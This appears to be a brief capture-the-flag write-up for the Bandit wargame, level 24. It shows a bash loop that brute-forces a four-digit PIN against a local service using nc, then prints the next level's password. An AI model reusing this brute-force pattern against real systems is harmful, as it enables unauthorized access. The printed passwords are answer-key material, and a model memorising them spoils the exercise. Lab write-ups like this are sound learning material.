#!/bin/bash



for i in {0000..9999}
do  
#####send UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ followed by $i to local host #port 30002 using nc then put nc output to a file named nc_out_$i       

echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 >> nc_out_$i

done

This way the output of each nc connection will be saved to a file with the value of $i in its name.
Go to sleep until the loop is over :)

I printed the output of a file:
$cat nc_out_1234

Wrong! Please enter the correct pincode. Try again.
Exiting.

So I supposed that the correct file will have the word correct:
$ grep Correct *
nc_out_ZZZZ:Correct!
$cat nc_out_ZZZZ

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Correct!

The password of user bandit25 is 
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG